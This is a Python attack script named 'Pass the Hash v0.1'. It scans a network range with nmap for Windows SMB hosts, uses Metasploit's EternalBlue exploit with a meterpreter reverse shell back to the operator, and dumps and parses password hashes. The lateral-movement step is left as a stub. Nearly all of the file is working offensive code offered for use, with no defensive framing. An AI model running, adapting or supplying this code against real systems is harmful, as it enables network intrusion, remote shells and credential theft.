from __future__ import print_function
import nmap
import re
import sys
import subprocess
import ssl
import time
from subprocess import call
from metasploit.msfrpc import MsfRpcClient

def header():
    print("""
      ___                     ___     
     /  /\        ___        /__/\    
    /  /::\      /  /\       \  \:\   
   /  /:/\:\    /  /:/        \__\:\  
  /  /:/~/:/   /  /:/     ___ /  /::\ 
 /__/:/ /:/   /  /::\    /__/\  /:/\:\\
 \  \:\/:/   /__/:/\:\   \  \:\/:/__\/
  \  \::/    \__\/  \:\   \  \::/     
   \  \:\         \  \:\   \  \:\     
    \  \:\         \__\/    \  \:\    
     \__\/                   \__\/ 
     
          Pass the Hash v0.1   
    """)

def convertIpToRange(ip):
	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
	return rgx.match(ip).group() + '0-255'

def gatherHashes(blob):
    """
    Returns a list of tuples (username, userID, hash)
    """
    rgx = re.compile(r'([A-Za-z0-9]+):(\d+:)([A-Za-z0-9]+:[A-Za-z0-9]+):')
    dataGroups = []
    for r in rgx.finditer(blob):
        dataGroups.append(r.groups())
    return dataGroups

def nmScan(ip):
    """
    Returns a list of dictionaries:
        { 'ip': '...', osfamily': '...', 'osgen': [...] }
    """
    targets = []
    range = convertIpToRange(ip)
    nm = nmap.PortScanner()
    print("Starting nmap scan over range: " + range + "...")
    nm.scan(hosts=range, arguments="-O -n -p445,139")
    hosts = nm.all_hosts()
	# For each running machine IP picked up by nmap
    for host in hosts:
		# If they have OS information
    	if 'osmatch' in nm[host]:
            host_obj = {'ip': host, 'osfamily': "", 'osgen': []}
			# Look through all possible OS matches
            for os in nm[host]['osmatch']:
                for c in os['osclass']:
					# If the OS family is Windows add the machine to possible targets
                    if c['osfamily'] == "Windows":
                        if len(host_obj['osfamily']) == 0:
                            host_obj['osfamily'] = c['osfamily']
                        host_obj['osgen'].append(c['osgen'])
            if host_obj['osfamily'] == "Windows":
                targets.append(host_obj)
    return targets

def eternalBlue(ip, localip):
    print('Attempting to exploit ' + str(ip) + ' to gain access to the network...')
    # Setup SSL fix
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        pass
    else:
        ssl._create_default_https_context = _create_unverified_https_context
    # Create the connection to the RPC client
    client = MsfRpcClient('password')
    # Load eternal blue exploit
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    exploit['RHOST'] = ip
    # Load the reverse_tcp shell payload
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    payload['LHOST'] = localip
    # Exploit the host
    proc = exploit.execute(payload=payload)
    jobId = proc.get('job_id')
    if jobId == 0:
        jobId = 1
    timeout = 100
    count = 0
    while(jobId not in client.sessions.list.keys() and count < timeout):
        time.sleep(3)
        count += 1
    if count >= timeout:
        return None
    # Get the shell and run the hashdump
    shell = client.sessions.session(jobId)
    if shell == None:
        return None
    shell.runsingle('run post/windows/gather/hashdump')
    
    while(True):
        output = shell.read()
        if(':::' in output):
            hashes = gatherHashes(output)
            print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
            return hashes

def getArgs(argv):
    if len(argv) < 4:
        print('Needs proper command line args')
        return None
    args = {}
    i = 0
    while i < len(argv):
        if argv[i] == '-t':
            args['targetIp'] = argv[i+1]
            i += 2
        elif argv[i] == '-l':
            args['localIp'] = argv[i+1]
            i += 2
        else:
            i += 1
    return args
        
def main():
    header()
    # print('Starting msfrpc server...')
    # call(["msfrpcd", "-P", "password", "-n", "-f", "-a", "127.0.0.1", "&"])
    args = getArgs(sys.argv)
    if args == None:
        return
    targets = nmScan(args['targetIp'])
    print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
    # Try to break into machines with eternal blue
    for i in range(len(targets)):
        hashData = eternalBlue(targets[i].get('ip'), args['localIp'])
        if hashData != None:
            targets.pop(i)
            initHashData = hashData
            break
    if len(initHashData) > 0:
        # Found access to network start spidering
        print('Starting hash passing...')
        pass
    else:
        print('Could not gain access to network... bye!')

if __name__ == "__main__":
    # execute only if run as a script
    main()

